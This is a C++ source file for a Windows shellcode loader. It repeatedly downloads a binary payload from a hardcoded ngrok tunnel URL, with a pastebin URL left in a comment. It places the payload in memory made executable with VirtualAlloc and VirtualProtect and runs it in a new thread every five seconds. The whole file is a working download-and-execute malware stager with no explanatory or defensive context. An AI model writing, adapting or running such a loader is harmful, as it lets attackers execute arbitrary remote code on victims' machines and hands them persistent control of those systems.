#include <iostream>
#include <iterator>
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet")

#define DEFAULT_BUFLEN 4096

using namespace std;

void get_buf(const char* url, char (&copied_buf)[DEFAULT_BUFLEN])
{
    HINTERNET hInternetSession;
    HINTERNET hURL;
    // I'm only going to access 1K of info.
    BOOL bResult;
    DWORD dwBytesRead=1;

    // Make internet connection.
    hInternetSession = InternetOpen(
        "test", // agent
        INTERNET_OPEN_TYPE_PRECONFIG,  // access
        NULL, NULL, 0);                // defaults

    // Make connection to desired page.
    hURL = InternetOpenUrl(
        hInternetSession,                       // session handle
        url,//"https://pastebin.com/raw/BE4BJkrG",        // URL to access
        NULL, 0, 0, 0);                         // defaults

    // Read page into memory buffer.

    char buf[DEFAULT_BUFLEN];

    DWORD dwTemp;

    for (;dwBytesRead>0;)
    {
        InternetReadFile(hURL, buf, (DWORD)sizeof(buf), &dwBytesRead);
    }

    // printf("%s\n", buf);

    InternetCloseHandle(hURL);
    InternetCloseHandle(hInternetSession);

    //printf("%s\n", buf);
    //return buf;
    copy(begin(buf), end(buf), begin(copied_buf));
}

int getShellcode_Run(const char* url) {
    while (true)
    {
        char recvbuf[DEFAULT_BUFLEN];
        get_buf(url, recvbuf);

        // custom[o,'l[''[lo'[l['l]]]]]
        LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(recvbuf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (!alloc_mem) {
            printf("Failed to Allocate memory (%u)\n", GetLastError());
            return -1;
        }
        
        MoveMemory(alloc_mem, recvbuf, sizeof(recvbuf));
        //RtlMoveMemory(alloc_mem, recvbuf, sizeof(recvbuf));


        DWORD oldProtect;

        if (!VirtualProtect(alloc_mem, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect)) {
            printf("Failed to change memory protection (%u)\n", GetLastError());
            return -2;
        }


        HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
        if (!tHandle) {
            printf("Failed to Create the thread (%u)\n", GetLastError());
            return -3;
        }
        
        printf("\n\nrecvbuf : %s\n", (char*)recvbuf);
        printf("alloc_mem : %p\n", alloc_mem);
        WaitForSingleObject(tHandle, INFINITE);
        //getchar();
        // or

        //((void(*)())alloc_mem)();

        Sleep(5000);
    }
}


int main(int argc, char** argv) {
    const char* url = "https://dcbf-141-101-226-178.ngrok-free.app/bincode.bin";
    getShellcode_Run(url);

    return 0;
};
